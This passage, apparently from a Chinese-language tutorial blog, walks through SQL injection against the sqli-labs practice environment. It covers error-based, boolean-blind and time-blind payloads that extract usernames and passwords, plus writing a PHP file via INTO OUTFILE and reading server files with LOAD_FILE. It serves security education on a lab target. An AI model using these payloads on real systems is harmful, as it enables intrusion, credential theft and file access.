table_schema=&#39;security&#39; --+</code></p></blockquote><blockquote></blockquote><p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7fbc489b-c32b-42ad-ae35-3ca5ed0847ac/Untitled.png" alt="Untitled"></p><p>这里需要加上<code>table_schema</code>来限制数据库，否则会将数据库中所有的user表内字段都查询出来</p><h3 id="8、查询数据"><a href="#8、查询数据" class="headerlink" title="8、查询数据"></a>8、查询数据</h3><p>此时已经获取到了security.users表结构</p><p>可以进行数据的查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username,password <span class="keyword">from</span> security.users <span class="comment">-- </span></span><br></pre></td></tr></table></figure><blockquote><p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>&#39;union SELECT 1,group_concat(username,0x7e,password) from security.users--+</code></p></blockquote><p>0x7e是符号 ～ 的16进制</p><p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b23fae72-deb4-49b6-a2a7-21f28e1662a2/Untitled.png" alt="Untitled"></p><p>查询到所有表中的数据</p><h2 id="七、报错注入"><a href="#七、报错注入" class="headerlink" title="七、报错注入"></a>七、报错注入</h2><p>报错注入是通过使用特殊的函数构造payload，使后台的SQL语句执行时出错，并将报错信息回显在页面上，要查询的信息也会随着报错信息回显</p><p><a href="http://192.168.31.98/sqli-labs/Less-11/">http://192.168.31.98/sqli-labs/Less-11/</a></p><p>之前输入单引号进行报错，从而判断闭合方式的，也是一种报错</p><aside><p>💡 从这里就可以看出报错注入的限制，必须要求网站能将报错信息详细的回显到页面上</p></aside><p><strong>Xpath语法错误：</strong><code>extractvalue()</code>、<code>updatexml()</code></p><h3 id="1、判断闭合-1"><a href="#1、判断闭合-1" class="headerlink" title="1、判断闭合"></a>1、判断闭合</h3><p>传值</p><blockquote><p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;</code></p></blockquote><blockquote></blockquote><p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7bfc4e68-7c8b-43b6-81af-81e2c6bf3506/Untitled.png" alt="Untitled"></p><p>通过页面报错信息，可以判断当前页面使用了单引号进行闭合</p><h3 id="2、判断列数-1"><a href="#2、判断列数-1" class="headerlink" title="2、判断列数"></a><del>2、判断列数</del></h3><aside><p>⚠️ <del>由于并不使用页面本身的回显，这里不需要判断列数</del></p></aside><p><del>分别传值</del></p><blockquote><p><del>uname&#x3D;~~~~&#96;admin<code>~~~~&amp;passwd=~~~~</code>‘order by 1–+<br><code>~~~~uname=~~~~</code>admin<code>~~~~&amp;passwd=~~~~</code>‘order by 2–+<br><code>~~~~uname=~~~~</code>admin<code>~~~~&amp;passwd=~~~~</code>‘order by 3–+&#96;</del></p></blockquote><p><del>当传入值为1和2时，页面响应正常。</del></p><p><del>当传入值为3时，页面报错提示~~~~&#96;Unknown column ‘3’ in ‘order clause’&#96;</del></p><p><del>表示在当前的查询语句中只有两个字段</del></p><h3 id="3、查询数据库"><a href="#3、查询数据库" class="headerlink" title="3、查询数据库"></a>3、查询数据库</h3><p>报错注入并不使用查询的回显位置进行回显，因此不需要判断查询的回显位置</p><p>使用以下语句查询所有数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> schema_name <span class="keyword">from</span> information_schema.SCHEMATA</span><br></pre></td></tr></table></figure><blockquote><p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>&#39;and updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata)),3)--+</code></p></blockquote><h3 id="⚠️-查询数据不全"><a href="#⚠️-查询数据不全" class="headerlink" title="⚠️ 查询数据不全"></a>⚠️ 查询数据不全</h3><p>此时可以发现查询出的数据库信息不全</p><p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/00a75786-8d25-4aba-83ba-939f7c68c6a6/Untitled.png" alt="Untitled"></p><p>这里是由于<code>extractvalue()</code>和<code>updatexml()</code>最多只能报32个字的错误，其余的都被省略了</p><p>要想其余被省略的信息显示出来，可以使用where子句添加条件限制输出结果</p><p>例如在此处，若是想要查询其他数据库名，可添加子句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">where</span> schema_name <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;information_schema&#x27;</span>,<span class="string">&#x27;challenges&#x27;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>&#39;and updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata where schema_name not in (&#39;information_schema&#39;,&#39;challenges&#39;))),3)--+</code></p></blockquote><blockquote></blockquote><p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/0a4aac31-6833-4573-981c-ac7998c6f3a3/Untitled.png" alt="Untitled"></p><p>将已知结果排除在外，便可看到新的结果</p><h3 id="4、查询指定数据库内的表"><a href="#4、查询指定数据库内的表" class="headerlink" title="4、查询指定数据库内的表"></a>4、查询指定数据库内的表</h3><p>这里来查询<code>security</code>数据库内的表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="comment">-- </span></span><br></pre></td></tr></table></figure><blockquote><p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>&#39;and updatexml(1,concat(0x7e,(SELECT group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)),3) --+</code></p></blockquote><blockquote></blockquote><p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/cf776d6f-237a-4ef3-aa65-ceadff18b349/Untitled.png" alt="Untitled"></p><p>若是数据显示不全，则使用<code>where</code>子句进行限制</p><p>若要查询其他数据库内的表，则更换<code>table_schema</code>的值即可</p><h3 id="5、查询表内字段"><a href="#5、查询表内字段" class="headerlink" title="5、查询表内字段"></a>5、查询表内字段</h3><p>这里来查询表<code>security.users</code> 内的字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> <span class="keyword">and</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="comment">-- </span></span><br></pre></td></tr></table></figure><blockquote><p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>&#39;and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=&#39;security&#39;)),3)--+</code></p></blockquote><blockquote></blockquote><p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/9d9c6276-8f12-42ee-80c2-5d6a3fc3bd66/Untitled.png" alt="Untitled"></p><p>这里需要加上<code>table_schema</code>来限制数据库，否则会将数据库中所有的user表内字段都查询出来</p><p>若是数据显示不全，则使用<code>where</code>子句进行限制</p><p>若要查询其他数据库内的表，则更换<code>table_schema</code>和<code>table_name</code>的值即可</p><h3 id="6、查询数据"><a href="#6、查询数据" class="headerlink" title="6、查询数据"></a>6、查询数据</h3><p>此时已经获取到了security.users表结构</p><p>可以进行数据的查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username,password <span class="keyword">from</span> security.users <span class="comment">-- </span></span><br></pre></td></tr></table></figure><blockquote><p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>&#39;and updatexml(1,concat(0x7e,(SELECT group_concat(username,0x7e,password) from security.users)),3) --+</code></p></blockquote><blockquote></blockquote><p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/10b5475b-8488-4caf-bb37-c1cc55ee3e1c/Untitled.png" alt="Untitled"></p><p>若要显示其他的数据，则可通过where子句进行限制</p><h2 id="八、布尔盲注"><a href="#八、布尔盲注" class="headerlink" title="八、布尔盲注"></a>八、布尔盲注</h2><p>盲注，则是在页面没有回显或回显不足以获取数据的情况下可以选择使用的注入方法</p><p>例如：</p><ul><li>登陆成功与否都不会回显任何数据库相关的值</li><li>没有报错信息回显</li><li>报错信息回显过于简单</li></ul><p>布尔盲注的基本原理是：通过判断页面对所构造的布尔表达式正确或错误的响应，推断出想得到的数据</p><aside><p>💡 <code>uname=admin</code>&amp;<code>passwd=&#39;or&#39;1&#39;=&#39;1</code></p></aside><p>在万能密码中就可以看到布尔盲注的影子</p><p>通过构造永真表达式，来绕过登陆验证</p><p>若将1&#x3D;1替换为1&#x3D;2这样的永假式，便不能成功登陆了</p><p>这里就可以看到，当后方表达式为真，则登陆成功;若表达式为假，则登陆失败</p><p>这样就可以通过构造类似于<code>database()=&#39;security&#39;</code> 这样的表达式，来进行数据库结构的推测</p><h3 id="1、判断闭合-2"><a href="#1、判断闭合-2" class="headerlink" title="1、判断闭合"></a>1、判断闭合</h3><p>由于环境条件的限制，断然不可能使用之前的观察报错信息的方法来判断闭合方式</p><p>可以采用永真和永假表达式来判断</p><p><a href="http://10.211.55.6/sqli-labs/Less-15/">http://10.211.55.6/sqli-labs/Less-15/</a></p><blockquote><p><code>uname=admin&amp;passwd=a&#39;or&#39;1&#39;=&#39;1</code>  # 页面返回成功<br><code>uname=admin&amp;passwd=a&#39;or&#39;1&#39;=&#39;2</code>  # 页面返回失败</p></blockquote><p>则表明使用了单引号进行闭合，同时还能得到<code>正确</code>和<code>错误</code>的不同响应页面</p><h3 id="2、判断正确和错误响应"><a href="#2、判断正确和错误响应" class="headerlink" title="2、判断正确和错误响应"></a>2、判断正确和错误响应</h3><p>通过传入永真式和永假式得到正确和错误的相应页面</p><blockquote><p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or&#39;1&#39;=&#39;1</code></p></blockquote><blockquote></blockquote><p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/51771881-a5e6-4100-9961-8dce8e95ce76/Untitled.png" alt="Untitled"></p><blockquote><p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or&#39;1&#39;=&#39;2</code></p></blockquote><blockquote></blockquote><p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c0e0238a-ddb6-4ef5-b2de-b889c150c95c/Untitled.png" alt="Untitled"></p><p>可与上一步判断闭合一起进行</p><h3 id="3、判断数据库数量"><a href="#3、判断数据库数量" class="headerlink" title="3、判断数据库数量"></a>3、判断数据库数量</h3><p>该步骤可有可无</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">count</span>(schema_name) <span class="keyword">from</span> information_schema.schemata</span><br></pre></td></tr></table></figure><blockquote><p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or (SELECT count(schema_name) from information_schema.schemata)=1--+</code>  # 错误<br>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or (SELECT count(schema_name) from information_schema.schemata)=2--+</code>  # 错误<br>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or (SELECT count(schema_name) from information_schema.schemata)=3--+</code>  # 错误<br>……<br>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or (SELECT count(schema_name) from information_schema.schemata)=7--+</code>  # 错误<br>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or (SELECT count(schema_name) from information_schema.schemata)=8--+</code>  # 错误<br>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or (SELECT count(schema_name) from information_schema.schemata)=9--+</code>  # 正确</p></blockquote><p>除了等号，其他符号也可以进行判断 <code>&gt;</code> <code>&lt;</code> <code>&lt;&gt;</code> <code>LIKE</code> </p><blockquote><p>1–+<code>  # 正确 uname=</code>admin<code>&amp;passwd=</code>a’or (SELECT count(schema_name) from information_schema.schemata)10–+<code>  # 错误 uname=</code>admin<code>&amp;passwd=</code>a’or (SELECT count(schema_name) from information_schema.schemata)5–+<code>  # 正确 uname=</code>admin<code>&amp;passwd=</code>a’or (SELECT count(schema_name) from information_schema.schemata)7–+<code>  # 正确 uname=</code>admin<code>&amp;passwd=</code>a’or (SELECT count(schema_name) from information_schema.schemata)9–+&#96;  # 正确</p></blockquote><blockquote><p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or (SELECT count(schema_name) from information_schema.schemata) LIKE 8--+</code>  # 错误<br>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or (SELECT count(schema_name) from information_schema.schemata) LIKE 9--+</code>  # 正确</p></blockquote><h3 id="4、判断数据库"><a href="#4、判断数据库" class="headerlink" title="4、判断数据库"></a>4、判断数据库</h3><p>使用<code>limit</code>关键字来限制输出</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> schema_name <span class="keyword">from</span> information_schema.schemata LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>使用字符串处理函数获取某一位的字符</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">LEFT</span>((<span class="keyword">SELECT</span> schema_name <span class="keyword">from</span> information_schema.schemata LIMIT <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>类似的函数还有：<code>right()</code> <code>left()</code> <code>MID()</code> <code>reverse()</code> <code>RPAD()</code> 等</p><blockquote><p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or LEFT((SELECT schema_name from information_schema.schemata LIMIT 7,1),1) LIKE &#39;s&#39;--+ </code>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or LEFT((SELECT schema_name from information_schema.schemata LIMIT 7,1),2)=&#39;se&#39;--+ </code>……<br>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or LEFT((SELECT schema_name from information_schema.schemata LIMIT 7,1),8)=&#39;security&#39;--+</code></p></blockquote><h3 id="5、判断表名"><a href="#5、判断表名" class="headerlink" title="5、判断表名"></a>5、判断表名</h3><p>查询数据库security中的表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span></span><br></pre></td></tr></table></figure><p>判断表名</p><blockquote><p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or LEFT((SELECT table_name from information_schema.tables where table_schema=&#39;security&#39; LIMIT 0,1),1)=&#39;e&#39;--+ </code>……<br>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or LEFT((SELECT table_name from information_schema.tables where table_schema=&#39;security&#39; LIMIT 3,1),1)=&#39;u&#39;--+ </code>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or LEFT((SELECT table_name from information_schema.tables where table_schema=&#39;security&#39; LIMIT 3,1),5)=&#39;users&#39;--+</code></p></blockquote><p>不断推测出其他的表名</p><h3 id="6、判断列名"><a href="#6、判断列名" class="headerlink" title="6、判断列名"></a>6、判断列名</h3><p>查询security.users表中的字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span></span><br></pre></td></tr></table></figure><blockquote><p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or LEFT((SELECT column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; LIMIT 0,1),1)=&#39;i&#39;--+ </code>…….<br>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or LEFT((SELECT column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; LIMIT 1,1),8)=&#39;username&#39;--+ </code>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or LEFT((SELECT column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; LIMIT 2,1),8)=&#39;password&#39;--+</code></p></blockquote><h3 id="7、猜测数据"><a href="#7、猜测数据" class="headerlink" title="7、猜测数据"></a>7、猜测数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username <span class="keyword">from</span> security.users</span><br><span class="line"><span class="keyword">SELECT</span> concat_ws(<span class="string">&#x27;:&#x27;</span>,username,password) <span class="keyword">from</span> security.users</span><br><span class="line"><span class="keyword">SELECT</span> GROUP_CONCAT(username,<span class="string">&#x27;:&#x27;</span>,password) <span class="keyword">from</span> security.users</span><br></pre></td></tr></table></figure><blockquote><p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or LEFT((SELECT username from security.users LIMIT 0,1),1)=&#39;d&#39;--+ </code>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or LEFT((SELECT concat_ws(&#39;:&#39;,username,password) from security.users LIMIT 0,1),9)=&#39;dumb:dumb&#39;--+ </code>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>a&#39;or LEFT((SELECT GROUP_CONCAT(username,&#39;:&#39;,password) from security.users),14)=&#39;dumb:dumb,ange&#39;--+</code></p></blockquote><h2 id="九、时间盲注"><a href="#九、时间盲注" class="headerlink" title="九、时间盲注"></a>九、时间盲注</h2><p>布尔盲注适用于有错误与正确不同响应的页面，而对于那些无论对错，页面响应始终不变的网站，就可以使用时间盲注</p><p>时间盲注的基本原理和布尔注入相差不多，使用<code>if语句</code>以及<code>sleep函数</code>，构造布尔表达式，当布尔表达式正确时，则执行<code>sleep函数</code></p><p><a href="http://10.211.55.6/sqli-labs/Less-9/">http://10.211.55.6/sqli-labs/Less-9/</a></p><blockquote><p>?id&#x3D;<code>1&#39;and&#39;1&#39;=&#39;1 </code>?id&#x3D;<code>1&#39;and&#39;1&#39;=&#39;2</code></p></blockquote><blockquote></blockquote><p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/95740020-1501-4094-bc00-8dcafb4974c6/Untitled.png" alt="Untitled"></p><p>可以看到无论布尔表达式是否为True，页面响应都不变，此时再使用布尔盲注就不合适了</p><blockquote><p>?id&#x3D;<code>1&#39;and if(1=1,sleep(5),0)--+ </code>?id&#x3D;<code>1&#39;and if(1=2,sleep(5),0)--+</code></p></blockquote><p>可以明显观察到页面的响应时间不同，利用这个特性，就可以根据响应时长，判断布尔表达式是否正确</p><h3 id="1、判断闭合-3"><a href="#1、判断闭合-3" class="headerlink" title="1、判断闭合"></a>1、判断闭合</h3><blockquote><p>?id&#x3D;<code>1&#39;and if(1=1,sleep(5),0)--+</code></p></blockquote><p>将单引号替换为其他符号进行测试，出现延迟的符号即为正确的符号</p><h3 id="2、判断数据库"><a href="#2、判断数据库" class="headerlink" title="2、判断数据库"></a>2、判断数据库</h3><p>使用<code>limit</code>关键字来限制输出</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> schema_name <span class="keyword">from</span> information_schema.schemata LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>与布尔类型注入基本相同，但是使用<code>if语句</code>来进行判断</p><blockquote><p>?id&#x3D;<code>1&#39;and if((LEFT((SELECT schema_name from information_schema.schemata LIMIT 7,1),1) LIKE &#39;s&#39;),sleep(5),0)--+</code></p></blockquote><h3 id="3、判断表名"><a href="#3、判断表名" class="headerlink" title="3、判断表名"></a>3、判断表名</h3><p>查询数据库security中的表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span></span><br></pre></td></tr></table></figure><p>判断表名</p><blockquote><p>?id&#x3D;<code>1&#39;and if((LEFT((SELECT table_name from information_schema.tables where table_schema=&#39;security&#39; LIMIT 0,1),1)=&#39;e&#39;),sleep(5),0)--+</code></p></blockquote><p>不断推测出其他的表名</p><h3 id="4、判断列名"><a href="#4、判断列名" class="headerlink" title="4、判断列名"></a>4、判断列名</h3><p>查询security.users表中的字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span></span><br></pre></td></tr></table></figure><blockquote><p>?id&#x3D;<code>1&#39;and if((LEFT((SELECT column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; LIMIT 0,1),1)=&#39;i&#39;),sleep(5),0)--+</code></p></blockquote><h3 id="5、猜测数据"><a href="#5、猜测数据" class="headerlink" title="5、猜测数据"></a>5、猜测数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username <span class="keyword">from</span> security.users</span><br><span class="line"><span class="keyword">SELECT</span> concat_ws(<span class="string">&#x27;:&#x27;</span>,username,password) <span class="keyword">from</span> security.users</span><br><span class="line"><span class="keyword">SELECT</span> GROUP_CONCAT(username,<span class="string">&#x27;:&#x27;</span>,password) <span class="keyword">from</span> security.users</span><br></pre></td></tr></table></figure><blockquote><p>?id&#x3D;<code>1&#39;and if((LEFT((SELECT username from security.users LIMIT 0,1),1)=&#39;d&#39;),sleep(5),0)--+ </code>?id&#x3D;<code>1&#39;and if((LEFT((SELECT concat_ws(&#39;:&#39;,username,password) from security.users LIMIT 0,1),9)=&#39;dumb:dumb&#39;),sleep(5),0)--+ </code>?id&#x3D;<code>1&#39;and if((LEFT((SELECT GROUP_CONCAT(username,&#39;:&#39;,password) from security.users),14)=&#39;dumb:dumb,ange&#39;),sleep(5),0)--+</code></p></blockquote><h2 id="十、注入脚本编写"><a href="#十、注入脚本编写" class="headerlink" title="十、注入脚本编写"></a>十、注入脚本编写</h2><p>盲注与联合注入和报错注入不同，盲注需要逐字符的去不断猜测，如果单纯使用手工注入的话，就需要大量的时间</p><p>这里可以使用脚本进行批量的注入</p><h3 id="1、布尔盲注脚本"><a href="#1、布尔盲注脚本" class="headerlink" title="1、布尔盲注脚本"></a>1、布尔盲注脚本</h3><h3 id="2、时间盲注脚本"><a href="#2、时间盲注脚本" class="headerlink" title="2、时间盲注脚本"></a>2、时间盲注脚本</h3><h2 id="十一、注入写马与文件读取"><a href="#十一、注入写马与文件读取" class="headerlink" title="十一、注入写马与文件读取"></a>十一、注入写马与文件读取</h2><h3 id="1、先决条件"><a href="#1、先决条件" class="headerlink" title="1、先决条件"></a>1、先决条件</h3><ul><li>当前用户为<code>root权限</code>或具有<code>FILE权限</code>，使用语句进行查询</li><li><code>secure_file_priv=&#39;’</code></li><li>要写入的目录需要具有<code>写权限</code></li><li>获取当前网站绝对路径，绝对路径可以通过网站的各种信息泄露来发现</li><li>php的gpc为off状态，若在开启gpc的情况下，可以通过十六进制的路径读写文件</li></ul><p>查询当前用户权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> file_priv,<span class="keyword">user</span>,host <span class="keyword">from</span> mysql.user;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+---------------+-----------+</span></span><br><span class="line"><span class="operator">|</span> file_priv <span class="operator">|</span> <span class="keyword">user</span>          <span class="operator">|</span> host      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+---------------+-----------+</span></span><br><span class="line"><span class="operator">|</span> Y         <span class="operator">|</span> root          <span class="operator">|</span> localhost <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> N         <span class="operator">|</span> mysql.session <span class="operator">|</span> localhost <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> N         <span class="operator">|</span> mysql.sys     <span class="operator">|</span> localhost <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> N         <span class="operator">|</span> dvwa          <span class="operator">|</span> localhost <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Y         <span class="operator">|</span> root          <span class="operator">|</span> <span class="operator">%</span>         <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+---------------+-----------+</span></span><br><span class="line"><span class="number">5</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>查询<code>secure_file_priv</code> 的值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> @<span class="variable">@secure</span>_file_priv;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> @<span class="variable">@secure</span>_file_priv <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">NULL</span>               <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"># secure_file_priv 的值有三种情况</span><br><span class="line"><span class="number">1.</span> 空      那么对所有路径均可进行导入导出。</span><br><span class="line"><span class="number">2.</span> 目录    那么只允许在该路径下导入导出。</span><br><span class="line"><span class="number">3.</span> <span class="keyword">Null</span>   那么禁止所有导入导出。</span><br></pre></td></tr></table></figure><aside><p>💡 在<code>mysql 5.6.34</code>版本以后 <code>secure_file_priv</code>的值默认为<code>NULL</code></p></aside><h3 id="2、写入木马"><a href="#2、写入木马" class="headerlink" title="2、写入木马"></a>2、写入木马</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;? phpinfo(); ?&gt;&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;C:/ phpstudy_pro/WWW/phpinfo.php&#x27;</span>  # phpinfo()</span><br></pre></td></tr></table></figure><blockquote><p>‘ into outfile ‘C:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;phpinfo.php’–+&#96;</p></blockquote><p>若提示如下错误，则表明当前的文件夹没有权限进行上传</p><p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/89bdfd14-818d-44bf-8490-637f4d0199b4/Untitled.png" alt="Untitled"></p><aside><p>💡 windows下：修改<code>my.ini</code> 在<code>[mysqld]</code>内加入<code>secure_file_priv =</code></p><p>linux下：修改<code>my.cnf</code>在<code>[mysqld]</code>内加入<code>secure_file_priv =</code></p><p>然后重启mysql，再查询<code>secure_file_priv</code></p></aside><p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a7bc4f6c-3ef5-4df5-ace0-0e21be7b92a1/Untitled.png" alt="Untitled"></p><h3 id="3、读取文件"><a href="#3、读取文件" class="headerlink" title="3、读取文件"></a>3、读取文件</h3><p>读取文件使用的<code>load_file()</code> ,括号内传入文件路径。文件路径必须是<code>/</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> LOAD_FILE(<span class="string">&#x27;C:/phpstudy_pro/Extensions/MySQL5.7.26/my.ini&#x27;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>&#39;union select 1,LOAD_FILE(&#39;C:/phpstudy_pro/Extensions/MySQL5.7.26/my.ini&#39;)--+</code></p></blockquote><blockquote></blockquote><p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a5fbaf70-a1cc-4fce-95c8-d25c4c63e39b/Untitled.png" alt="Untitled"></p><h2 id="十一、宽字节注入"><a href="#十一、宽字节注入" class="headerlink" 